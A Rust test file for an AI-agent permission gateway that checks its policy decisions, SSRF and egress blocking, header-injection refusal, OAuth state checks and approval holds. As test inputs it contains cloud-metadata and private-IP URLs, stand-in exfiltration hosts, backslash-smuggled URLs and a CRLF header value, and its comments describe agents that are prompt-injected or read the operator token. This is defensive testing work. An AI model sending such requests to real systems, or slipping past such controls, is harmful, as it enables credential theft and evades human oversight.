    let status = resp.status();
    (status, body_json(resp).await)
}

#[tokio::test]
async fn ssh_exec_uptime_is_allowed_and_runs_through_the_mock() {
    // `uptime` is a Low-risk read on the SSH policy's allow list → Allow, and the mock transport
    // returns a canned exec result (exit 0). This proves invoke → policy → execute_ssh → runner.
    let (status, json) = ssh_invoke("ssh.uptime", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(json["decision"]["decision"], "allow");
    assert_eq!(json["result"]["exit_code"], 0);
    assert_eq!(json["result"]["output"], "permaura-bot\n");
}

#[tokio::test]
async fn ssh_sftp_list_is_allowed_and_returns_structured_entries() {
    let (status, json) = ssh_invoke("ssh.sftp.list", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(json["decision"]["decision"], "allow");
    let entries = json["result"]["entries"].as_array().expect("entries array");
    assert!(!entries.is_empty());
    assert!(entries[0]["name"].is_string());
}

#[tokio::test]
async fn ssh_sftp_get_is_allowed_and_returns_base64_content() {
    let (status, json) = ssh_invoke("ssh.sftp.get", serde_json::json!({ "path": "reports/q3.csv" })).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(json["decision"]["decision"], "allow");
    assert!(json["result"]["content_base64"].as_str().unwrap().len() > 0);
    assert!(json["result"]["bytes"].as_u64().unwrap() > 0);
}

#[tokio::test]
async fn ssh_sftp_put_is_denied_by_policy() {
    // The SSH policy denies `sftp.put` (the read-only, writes-blocked shape) → 403 Deny, before the
    // transport is ever reached.
    let (status, json) =
        ssh_invoke("ssh.sftp.put", serde_json::json!({ "path": "x.txt", "content": "aGVsbG8=" })).await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    assert_eq!(json["decision"]["decision"], "deny");
}

#[tokio::test]
async fn ssh_restart_service_escalates_to_human_approval() {
    // `restart-service` is High risk + self-declares approval → RequiresApproval (202), not executed
    // in-request. The metacharacter-free `{service}` value is fine; the gate is the risk, not the arg.
    let (status, json) =
        ssh_invoke("ssh.restart-service", serde_json::json!({ "service": "nginx" })).await;
    assert_eq!(status, StatusCode::ACCEPTED);
    assert_eq!(json["decision"]["decision"], "requires_approval");
}

#[tokio::test]
async fn ssh_capabilities_surface_in_mcp_tools_list_with_schemas() {
    // The SSH capabilities appear as first-class MCP tools with op-derived input schemas.
    let body = serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/list" });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/mcp")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    let tools = json["result"]["tools"].as_array().expect("tools array");
    let restart = tools
        .iter()
        .find(|t| t["name"] == "ssh.restart-service")
        .expect("ssh.restart-service tool is listed");
    // The exec placeholder is surfaced as a required string param.
    assert_eq!(restart["inputSchema"]["properties"]["service"]["type"], "string");
    let required = restart["inputSchema"]["required"].as_array().unwrap();
    assert!(required.iter().any(|v| v == "service"));
    // The put tool requires path + base64 content.
    let put = tools.iter().find(|t| t["name"] == "ssh.sftp.put").expect("sftp.put tool listed");
    let put_required = put["inputSchema"]["required"].as_array().unwrap();
    assert!(put_required.iter().any(|v| v == "content"));
}

/// SSRF / open-egress regression for the generic-HTTP proxy. The demo session token is both
/// operator (so it can create connections) and the approved `codex-cli` agent (so it can
/// invoke), which lets one router drive the whole create → credential → invoke flow.
#[tokio::test]
async fn generic_http_requires_allowlist_and_blocks_ssrf() {
    let router = app();
    let post = |uri: &'static str, body: serde_json::Value| {
        let router = router.clone();
        async move {
            router
                .oneshot(
                    Request::builder()
                        .method("POST")
                        .uri(uri)
                        .header("content-type", "application/json")
                        .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                        .body(Body::from(body.to_string()))
                        .unwrap(),
                )
                .await
                .unwrap()
        }
    };

    // 1. A generic-HTTP connection with NO allowlist is rejected at create time (fail-closed).
    let resp = post(
        "/v1/connections",
        serde_json::json!({ "id": "genhttp_noallow", "connector": "generic-http", "name": "No allowlist" }),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);

    // 2. With an operator allowlist it is accepted, and the credential can be added.
    let resp = post(
        "/v1/connections",
        serde_json::json!({
            "id": "genhttp",
            "connector": "generic-http",
            "name": "Generic HTTP",
            "allowed_hosts": ["api.example.com"]
        }),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::CREATED);
    let resp = post(
        "/v1/connections/genhttp/credential",
        serde_json::json!({ "value": "tok_generic" }),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::OK);

    // 3. An agent-supplied URL pointing at the GCP metadata endpoint is DENIED by the egress
    //    allowlist gate (the host is not on the allowlist), the credential-exfiltration path.
    let resp = post(
        "/v1/invoke",
        serde_json::json!({
            "capability": "genhttp.request",
            "params": { "url": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" },
            "reason": "prompt-injected metadata grab"
        }),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    let json = body_json(resp).await;
    assert_eq!(json["decision"]["decision"], "deny");
    assert_eq!(json["decision"]["reason"].as_str().unwrap().contains("169.254.169.254"), true);

    // 4. A private-range IP is likewise denied (not on the allowlist).
    let resp = post(
        "/v1/invoke",
        serde_json::json!({
            "capability": "genhttp.request",
            "params": { "url": "http://10.0.0.5:8080/admin" },
            "reason": "lateral movement attempt"
        }),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    assert_eq!(body_json(resp).await["decision"]["decision"], "deny");

    // 5. An arbitrary off-allowlist public host is denied too (open-egress proxy abuse).
    let resp = post(
        "/v1/invoke",
        serde_json::json!({
            "capability": "genhttp.request",
            "params": { "url": "https://exfil.evil.example/leak" },
            "reason": "egress laundering"
        }),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    assert_eq!(body_json(resp).await["decision"]["decision"], "deny");
}

/// Drive one request through `app` with the demo bearer (operator, and the approved `codex-cli` agent).
async fn demo_call(app: &axum::Router, method: &str, uri: &str, body: serde_json::Value) -> (StatusCode, serde_json::Value) {
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method(method)
                .uri(uri)
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    let status = resp.status();
    (status, body_json(resp).await)
}

/// A backslash ends the authority for the parser `reqwest` sends with, so this URL reaches
/// `attacker.example`. The allowlist must judge that host, not the one after the `@`, and nothing may be
/// sent at all.
#[tokio::test]
async fn generic_http_backslash_authority_never_leaves_the_allowlist() {
    use permaura_gateway::connectors::MockHttpClient;
    common::isolate_from_the_real_install();
    let http = std::sync::Arc::new(MockHttpClient::new());
    let app = build_router(
        AppState::in_memory_seeded_with_http(http.clone()),
        "127.0.0.1:7376".parse().unwrap(),
    );
    let (s, _) = demo_call(&app, "POST", "/v1/connections", serde_json::json!({
        "id": "genhttp", "connector": "generic-http", "name": "Generic HTTP",
        "allowed_hosts": ["api.allowed.com"]
    })).await;
    assert_eq!(s, StatusCode::CREATED);
    let (s, _) = demo_call(&app, "POST", "/v1/connections/genhttp/credential", serde_json::json!({ "value": "tok_generic" })).await;
    assert_eq!(s, StatusCode::OK);
    let (_, pol) = demo_call(&app, "POST", "/v1/policies", serde_json::json!({
        "connection_id": "genhttp", "name": "proxy", "allow": ["request"]
    })).await;
    let (s, _) = demo_call(&app, "POST", "/v1/grants", serde_json::json!({
        "policy_id": pol["policy_id"], "target_agent": "codex-cli"
    })).await;
    assert_eq!(s, StatusCode::CREATED);

    for url in [
        "https://attacker.example\\@api.allowed.com/v1/data",
        "https://attacker.example\\@api.allowed.com:443/",
        "https://attacker.example/@api.allowed.com/",
    ] {
        let (s, json) = demo_call(&app, "POST", "/v1/invoke", serde_json::json!({
            "capability": "genhttp.request", "params": { "url": url }, "reason": "exfil"
        })).await;
        assert_eq!(s, StatusCode::FORBIDDEN, "{url}: {json}");
        let reason = json["decision"]["reason"].as_str().unwrap_or_default();
        assert!(reason.contains("backslash") || reason.contains("not on the allowlist"), "{url}: {reason}");
    }
    assert!(http.requests().is_empty(), "nothing may be sent for a refused URL: {:?}", http.requests());

    // The allowlisted host itself still works (held, as `http.request` is high risk), and once approved
    // the held-call recheck passes it and that host is where the request goes.
    let (s, json) = demo_call(&app, "POST", "/v1/invoke", serde_json::json!({
        "capability": "genhttp.request", "params": { "url": "https://api.allowed.com/v1/data" }
    })).await;
    assert_eq!(s, StatusCode::ACCEPTED, "{json}");
    let (s, json) = demo_call(&app, "POST", "/v1/approvals", serde_json::json!({
        "approval_id": json["approval_id"], "approve": true
    })).await;
    assert_eq!(s, StatusCode::OK, "{json}");
    assert_eq!(http.last_request().unwrap().host().as_deref(), Some("api.allowed.com"));
}

/// A built-in connection's capabilities are namespaced by the connection id. They used to fall through
/// to the generic proxy builder and send the sealed credential to `params.url` with no allowlist check.
#[tokio::test]
async fn builtin_connection_sends_its_credential_only_to_its_own_upstream() {
    use permaura_gateway::connectors::MockHttpClient;
    common::isolate_from_the_real_install();
    let http = std::sync::Arc::new(MockHttpClient::new());
    let app = build_router(
        AppState::in_memory_seeded_with_http(http.clone()),
        "127.0.0.1:7376".parse().unwrap(),
    );
    let (s, conn) = demo_call(&app, "POST", "/v1/connections", serde_json::json!({ "connector": "github", "name": "Work" })).await;
    assert_eq!(s, StatusCode::CREATED);
    let id = conn["connection_id"].as_str().unwrap().to_string();
    assert_ne!(id, "github", "the point is a namespaced capability id");
    demo_call(&app, "POST", &format!("/v1/connections/{id}/credential"), serde_json::json!({ "value": "ghp_secret" })).await;
    let (_, pol) = demo_call(&app, "POST", "/v1/policies", serde_json::json!({
        "connection_id": id, "name": "ro", "allow": ["repos.read"]
    })).await;
    demo_call(&app, "POST", "/v1/grants", serde_json::json!({
        "policy_id": pol["policy_id"], "target_agent": "codex-cli"
    })).await;

    let (s, json) = demo_call(&app, "POST", "/v1/invoke", serde_json::json!({
        "capability": format!("{id}.repos.read"),
        "params": { "repo": "a/b", "url": "https://attacker.example/collect" }
    })).await;
    assert_eq!(s, StatusCode::OK, "{json}");
    let sent = http.last_request().expect("one upstream request");
    assert_eq!(sent.host().as_deref(), Some("api.github.com"), "sent to {}", sent.url);
    assert!(sent.url.ends_with("/repos/a/b"), "{}", sent.url);
}

// ── POST /v1/shutdown (authenticated loopback graceful stop) ──────────────────────

fn shutdown_req(bearer: Option<&str>, remote: bool) -> Request<Body> {
    let mut b = Request::builder().method("POST").uri("/v1/shutdown");
    if let Some(t) = bearer {
        b = b.header("authorization", format!("Bearer {t}"));
    }
    if remote {
        // A Cloudflare edge stamp: proof the request arrived over the public tunnel, not loopback.
        b = b.header("cf-connecting-ip", "203.0.113.9");
    }
    b.body(Body::empty()).unwrap()
}

#[tokio::test]
async fn shutdown_requires_authentication() {
    let resp = app().oneshot(shutdown_req(None, false)).await.unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn shutdown_is_refused_over_the_public_tunnel() {
    // Loopback-only, like the other credential-free operator-plane primitives: a tunnelled caller is
    // rejected before auth even runs, so no operator token could be minted remotely to stop a gateway.
    let resp = app()
        .oneshot(shutdown_req(Some(seed::DEMO_TOKEN), true))
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn shutdown_is_unavailable_when_embedded() {
    // The daemon/tests reuse the router but never arm the shutdown signal: an operator-authenticated,
    // loopback call must report the path is unavailable (500), never a silent no-op success.
    let resp = app()
        .oneshot(shutdown_req(Some(seed::DEMO_TOKEN), false))
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::INTERNAL_SERVER_ERROR);
}

#[tokio::test]
async fn shutdown_signals_when_armed() {
    let signal = std::sync::Arc::new(tokio::sync::Notify::new());
    let state = common::seeded().with_shutdown(signal.clone());
    let router = build_router(state, "127.0.0.1:7376".parse().unwrap());

    let resp = router
        .oneshot(shutdown_req(Some(seed::DEMO_TOKEN), false))
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::ACCEPTED);

    // The handler fired the signal; the binary's graceful-shutdown future would now be woken.
    tokio::time::timeout(std::time::Duration::from_secs(1), signal.notified())
        .await
        .expect("shutdown signal was fired");
}

/// The push-token endpoint (register_push_token) used to take an UNAUTHENTICATED POST, so anyone who
/// could reach a gateway (a public tunnel bypasses the `/api/gw` proxy that gates it) could register a
/// push token and receive this account's approval notifications. It must now require an operator.
#[tokio::test]
async fn push_token_registration_rejects_an_unauthenticated_caller() {
    let router = build_router(common::seeded(), "127.0.0.1:7376".parse().unwrap());
    let resp = router
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/devices/push-token")
                .header("content-type", "application/json")
                // No Authorization header.
                .body(Body::from(r#"{"token":"ExponentPushToken[attacker]"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED, "unauthenticated push-token registration must be rejected");
}

/// ...and the operator (as the phone authenticates) still succeeds: the fix closes the hole without
/// breaking the real caller.
#[tokio::test]
async fn push_token_registration_succeeds_for_the_operator() {
    let router = build_router(common::seeded(), "127.0.0.1:7376".parse().unwrap());
    let resp = router
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/devices/push-token")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(r#"{"token":"ExponentPushToken[phone]"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["registered"], true);
}

/// A connector whose host or tenant header is account-specific (Mailchimp's data centre, DocuSign's
/// account base URI, Xero's `Xero-tenant-id`) cannot be complete in a manifest shared by everyone, so
/// `from-preset` accepts the missing piece per connection. The override is operator-supplied, https
/// only, and re-pins every capability: it never becomes agent-reachable.
#[tokio::test]
async fn from_preset_accepts_per_connection_base_url_and_header_overrides() {
    let app = app();
    let auth = format!("Bearer {}", seed::DEMO_TOKEN);
    let post = |app: axum::Router, body: String| {
        let auth = auth.clone();
        async move {
            app.oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/v1/connections/from-preset")
                    .header("content-type", "application/json")
                    .header("authorization", auth)
                    .body(Body::from(body))
                    .unwrap(),
            )
            .await
            .unwrap()
        }
    };

    let resp = post(
        app.clone(),
        serde_json::json!({
            "preset_id": "stripe",
            "name": "Acme books",
            "id": "acme-books",
            "base_url": "https://acme.example.com/v1/",
            "static_headers": { "X-Tenant-Id": "org-42" }
        })
        .to_string(),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::CREATED);
    let json = body_json(resp).await;
    // The trailing slash is normalised away, and the response reports the host actually pinned.
    assert_eq!(json["base_url"], "https://acme.example.com/v1");
    assert_eq!(json["customised"], true);

    // Without overrides the connection still reports the manifest's own host, and says so.
    let resp = post(
        app.clone(),
        serde_json::json!({ "preset_id": "stripe", "name": "Plain", "id": "plain" }).to_string(),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::CREATED);
    let json = body_json(resp).await;
    assert_eq!(json["base_url"], "https://api.stripe.com/v1");
    assert_eq!(json["customised"], false);
}

/// The override is an operator-pinned SSRF guard, so it has to be a clean absolute https origin, and
/// a header override may never carry a credential: that belongs in the sealed secret, not in a
/// connection record stored in the clear.
#[tokio::test]
async fn from_preset_rejects_unsafe_overrides() {
    let app = app();
    let auth = format!("Bearer {}", seed::DEMO_TOKEN);

    let cases: Vec<serde_json::Value> = vec![
        // Plaintext http would send the injected credential in the clear.
        serde_json::json!({ "base_url": "http://acme.example.com" }),
        // A relative or scheme-less value is not a pin at all.
        serde_json::json!({ "base_url": "/v1" }),
        // Userinfo smuggles a credential into the URL and makes the effective host ambiguous.
        serde_json::json!({ "base_url": "https://user:pass@acme.example.com" }),
        // A query string is not part of an origin.
        serde_json::json!({ "base_url": "https://acme.example.com?x=1" }),
        // Credential-bearing header names, however spelled.
        serde_json::json!({ "static_headers": { "Authorization": "Bearer x" } }),
        serde_json::json!({ "static_headers": { "X-Api-Key": "abc" } }),
        serde_json::json!({ "static_headers": { "x-refresh-token": "abc" } }),
        // `Host` would break routing to the pinned upstream.
        serde_json::json!({ "static_headers": { "host": "evil.example" } }),
        // CRLF in a value is header injection.
        serde_json::json!({ "static_headers": { "X-Tenant": "a\r\nX-Evil: 1" } }),
        // Not a valid HTTP header token.
        serde_json::json!({ "static_headers": { "Bad Header": "v" } }),
    ];

    for (i, extra) in cases.iter().enumerate() {
        let mut body = serde_json::json!({
            "preset_id": "stripe",
            "name": "X",
            "id": format!("refused-{i}"),
        });
        for (k, v) in extra.as_object().unwrap() {
            body[k] = v.clone();
        }
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/v1/connections/from-preset")
                    .header("content-type", "application/json")
                    .header("authorization", auth.clone())
                    .body(Body::from(body.to_string()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "case {i} should have been refused: {extra}"
        );
    }

    // Nothing was created by any of the refused calls: validation runs before the first write.
    let connections = get_authed_on(&app, "/v1/connections").await;
    let refused = connections["connections"]
        .as_array()
        .map(|a| a.iter().any(|c| c["id"].as_str().is_some_and(|i| i.starts_with("refused-"))))
        .unwrap_or(false);
    assert!(!refused, "a refused override must not leave a connection behind");
}

/// The bring-your-own-app OAuth dance, end to end: start it, follow the provider's redirect back,
/// and end up with a refreshable credential sealed on the gateway. This is what makes an OAuth
/// connector work indefinitely instead of for the life of one hand-pasted access token.
#[tokio::test]
async fn byo_oauth_dance_seals_a_refreshable_credential() {
    use permaura_gateway::connectors::{HttpResponse, MockHttpClient};

    let http = std::sync::Arc::new(MockHttpClient::new());
    common::isolate_from_the_real_install();
    let state = permaura_gateway::AppState::in_memory_seeded_with_http(http.clone());
    let app = permaura_gateway::build_router(state, "127.0.0.1:7376".parse().unwrap());
    let auth = format!("Bearer {}", seed::DEMO_TOKEN);

    let post = |app: axum::Router, uri: String, body: String| {
        let auth = auth.clone();
        async move {
            app.oneshot(
                Request::builder()
                    .method("POST")
                    .uri(uri)
                    .header("content-type", "application/json")
                    .header("authorization", auth)
                    .body(Body::from(body))
                    .unwrap(),
            )
            .await
            .unwrap()
        }
    };

    // A connection from a preset that advertises OAuth.
    let resp = post(
        app.clone(),
        "/v1/connections/from-preset".into(),
        serde_json::json!({ "preset_id": "github", "name": "Work", "id": "gh-work" }).to_string(),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::CREATED);

    // Start the dance with the operator's own OAuth app.
    let resp = post(
        app.clone(),
        "/v1/connections/gh-work/oauth/start".into(),
        serde_json::json!({
            "client_id": "my-client-id",
            "client_secret": "my-client-secret",
            "redirect_uri": "http://127.0.0.1:7376/oauth/callback"
        })
        .to_string(),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::OK);
    let started = body_json(resp).await;
    let url = started["authorize_url"].as_str().unwrap().to_string();
    // The authorize URL points at the provider from the CATALOG, never at anything the caller sent.
    assert!(url.starts_with("https://github.com/login/oauth/authorize?"), "got {url}");
    assert!(url.contains("client_id=my-client-id"));
    let state_token = url
        .split("state=")
        .nth(1)
        .and_then(|s| s.split('&').next())
        .expect("authorize URL carries a state")
        .to_string();
    assert!(state_token.len() > 20, "state must be long and unguessable");

    // The provider redirects the browser back. Queue what its token endpoint will answer.
    http.push_response(HttpResponse::json(
        200,
        serde_json::json!({
            "access_token": "at-1", "refresh_token": "rt-1", "expires_in": 3600, "scope": "repo"
        }),
    ));
    let callback = |app: axum::Router, qs: String| async move {
        app.oneshot(
            Request::builder()
                .method("GET")
                .uri(format!("/oauth/callback?{qs}"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap()
    };
    let resp = callback(app.clone(), format!("code=the-code&state={state_token}")).await;
    assert_eq!(resp.status(), StatusCode::OK);
    let page = axum::body::to_bytes(resp.into_body(), usize::MAX).await.unwrap();
    let page = String::from_utf8_lossy(&page);
    assert!(page.contains("Connected"), "got {page}");

    // The exchange was form-encoded (a JSON body is rejected by every real provider) and carried the
    // client secret and the redirect URI the provider will check.
    let sent = http.requests();
    let exchange = sent.last().expect("a token exchange was sent");
    assert_eq!(exchange.url, "https://github.com/login/oauth/access_token");
    let form = exchange.form.as_ref().expect("must be form-encoded");
    assert_eq!(form.get("grant_type").unwrap(), "authorization_code");
    assert_eq!(form.get("code").unwrap(), "the-code");
    assert_eq!(form.get("client_secret").unwrap(), "my-client-secret");
    assert_eq!(form.get("redirect_uri").unwrap(), "http://127.0.0.1:7376/oauth/callback");

    // Replaying the same state is refused: single-use is the OAuth CSRF guard.
    let resp = callback(app.clone(), format!("code=the-code&state={state_token}")).await;
    let page = axum::body::to_bytes(resp.into_body(), usize::MAX).await.unwrap();
    assert!(String::from_utf8_lossy(&page).contains("expired"));

    // A forged state was never minted here, so it is refused the same way.
    let resp = callback(app.clone(), "code=x&state=forged".into()).await;
    let page = axum::body::to_bytes(resp.into_body(), usize::MAX).await.unwrap();
    assert!(String::from_utf8_lossy(&page).contains("expired"));
}

/// A provider that returns no refresh token is refused rather than sealed: a credential that dies
/// when its access token expires is exactly the failure this path exists to remove.
#[tokio::test]
async fn byo_oauth_refuses_a_provider_response_with_no_refresh_token() {
    use permaura_gateway::connectors::{HttpResponse, MockHttpClient};

    let http = std::sync::Arc::new(MockHttpClient::new());
    common::isolate_from_the_real_install();
    let state = permaura_gateway::AppState::in_memory_seeded_with_http(http.clone());
    let app = permaura_gateway::build_router(state, "127.0.0.1:7376".parse().unwrap());
    let auth = format!("Bearer {}", seed::DEMO_TOKEN);

    for (uri, body) in [
        (
            "/v1/connections/from-preset",
            serde_json::json!({ "preset_id": "github", "name": "W", "id": "gh2" }).to_string(),
        ),
        (
            "/v1/connections/gh2/oauth/start",
            serde_json::json!({
                "client_id": "cid", "client_secret": "sec",
                "redirect_uri": "http://127.0.0.1:7376/oauth/callback"
            })
            .to_string(),
        ),
    ] {
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(uri)
                    .header("content-type", "application/json")
                    .header("authorization", auth.clone())
                    .body(Body::from(body))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert!(resp.status().is_success(), "{uri} failed");
        if uri.ends_with("start") {
            let started = body_json(resp).await;
            let url = started["authorize_url"].as_str().unwrap().to_string();
            let st = url.split("state=").nth(1).unwrap().split('&').next().unwrap().to_string();

            http.push_response(HttpResponse::json(
                200,
                serde_json::json!({ "access_token": "at", "expires_in": 3600 }),
            ));
            let resp = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!("/oauth/callback?code=c&state={st}"))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();
            let page = axum::body::to_bytes(resp.into_body(), usize::MAX).await.unwrap();
            let page = String::from_utf8_lossy(&page);
            assert!(page.contains("no refresh token"), "got {page}");
        }
    }
}

/// `redirect_uri` is validated: loopback may be plaintext, anything else must be https, or the
/// authorization code would cross the network in the clear.
#[tokio::test]
async fn byo_oauth_start_validates_the_redirect_uri() {
    let app = app();
    let auth = format!("Bearer {}", seed::DEMO_TOKEN);
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/connections/from-preset")
                .header("content-type", "application/json")
                .header("authorization", auth.clone())
                .body(Body::from(
                    serde_json::json!({ "preset_id": "github", "name": "W", "id": "gh3" }).to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::CREATED);

    for (redirect, ok) in [
        ("http://127.0.0.1:7376/oauth/callback", true),
        ("http://localhost:7376/oauth/callback", true),
        ("https://gw.example.com/oauth/callback", true),
        ("http://evil.example.com/oauth/callback", false),
        ("ftp://x/", false),
    ] {
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/v1/connections/gh3/oauth/start")
                    .header("content-type", "application/json")
                    .header("authorization", auth.clone())
                    .body(Body::from(
                        serde_json::json!({
                            "client_id": "c", "client_secret": "s", "redirect_uri": redirect
                        })
                        .to_string(),
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status().is_success(), ok, "redirect_uri {redirect} judged wrongly");
    }
}


// ── A destructive mutation holds even over loopback ──────────────────────────────────────────────

/// The gate, end to end through the router rather than as a predicate.
///
/// Loopback is the case that matters. Every other control-plane hold starts with `remote &&`, on the
/// assumption that whoever reaches loopback is the owner sitting at the host. On a machine that runs
/// agents that is false in the way this product exists to address: an agent running as the owner reads
/// the 0600 operator token and IS loopback.
#[tokio::test]
async fn a_policy_delete_holds_for_a_device_signature_even_over_loopback() {
    let state = common::seeded();
    let sk = ed25519_dalek::SigningKey::from_bytes(&[13u8; 32]);
    let pubkey = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        sk.verifying_key().to_bytes(),
    );
    assert!(state.service.trust_approver_key("device:alice", &pubkey));
    let app = build_router(state, "127.0.0.1:7376".parse().unwrap());

    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("DELETE")
                .uri("/v1/policies/pol_github_prs")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(
        resp.status(),
        StatusCode::ACCEPTED,
        "a delete is exempt from the tightening test, so without the destructive axis this is a 200"
    );
    let body = axum::body::to_bytes(resp.into_body(), usize::MAX).await.unwrap();
    let json: serde_json::Value = serde_json::from_slice(&body).unwrap();
    assert_eq!(json["status"], "requires_approval");
    assert_eq!(json["required_tier"], "device_signed");
}

/// With nothing that could sign, the delete proceeds. Same rule as the export: a registered device
/// signs, and where there is none the operation is not blocked on a signature nobody can produce.
#[tokio::test]
async fn a_policy_delete_is_not_held_when_no_device_is_registered() {
    let app = app();
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("DELETE")
                .uri("/v1/policies/pol_github_prs")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
}

/// An upstream that counts what reaches it, so a test can say nothing did.
struct CountingUpstream(std::sync::atomic::AtomicUsize);

#[async_trait::async_trait]
impl permaura_gateway::connectors::HttpClient for CountingUpstream {
    async fn send(
        &self,
        _request: permaura_gateway::connectors::HttpRequest,
    ) -> anyhow::Result<permaura_gateway::connectors::HttpResponse> {
        self.0.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        Ok(permaura_gateway::connectors::HttpResponse::json(200, serde_json::json!({ "transactions": [] })))
    }
}

/// `permaura_explain_denial` said it executes nothing, and ran the capability: it called `invoke` with
/// empty params, so explaining an allowed action sent it upstream and wrote its attempt and terminal
/// events. Through REST, `explain_only` was ignored and the call ran with the agent's own params. Both
/// now ask the gates for the verdict and stop there.
#[tokio::test]
async fn explaining_an_action_runs_nothing_and_records_nothing() {
    common::isolate_from_the_real_install();
    let upstream = std::sync::Arc::new(CountingUpstream(std::sync::atomic::AtomicUsize::new(0)));
    let state = AppState::in_memory_seeded_with_http(upstream.clone());
    let app = build_router(state.clone(), "127.0.0.1:7376".parse().unwrap());
    let recorded = state.service.store().audit_len().unwrap();

    let explain = |capability: &str| {
        serde_json::json!({
            "jsonrpc": "2.0", "id": 1, "method": "tools/call",
            "params": { "name": "permaura_explain_denial", "arguments": { "capability": capability } },
        })
    };
    let ask = |uri: &'static str, body: serde_json::Value| {
        let app = app.clone();
        async move {
            let resp = app
                .oneshot(
                    Request::builder()
                        .method("POST")
                        .uri(uri)
                        .header("content-type", "application/json")
                        .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                        .body(Body::from(body.to_string()))
                        .unwrap(),
                )
                .await
                .unwrap();
            let status = resp.status();
            let bytes = axum::body::to_bytes(resp.into_body(), usize::MAX).await.unwrap();
            (status, serde_json::from_slice::<serde_json::Value>(&bytes).unwrap())
        }
    };

    let (_s, body) = ask("/mcp", explain("braintree.transactions.search")).await;
    assert_eq!(body["result"]["structuredContent"]["decision"]["decision"], "allow", "{body}");
    let (_s, body) = ask("/mcp", explain("braintree.transactions.refund")).await;
    assert_eq!(body["result"]["structuredContent"]["decision"]["decision"], "deny", "{body}");

    let (status, body) = ask("/v1/invoke", serde_json::json!({
        "capability": "braintree.transactions.search",
        "params": { "status": "failed" },
        "explain_only": true,
    }))
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["decision"]["decision"], "allow", "{body}");
    assert!(body.get("result").is_none(), "an explanation carries no result: {body}");

    assert_eq!(upstream.0.load(std::sync::atomic::Ordering::SeqCst), 0, "nothing reached the upstream");
    assert_eq!(state.service.store().audit_len().unwrap(), recorded, "and nothing was written to the chain");
}
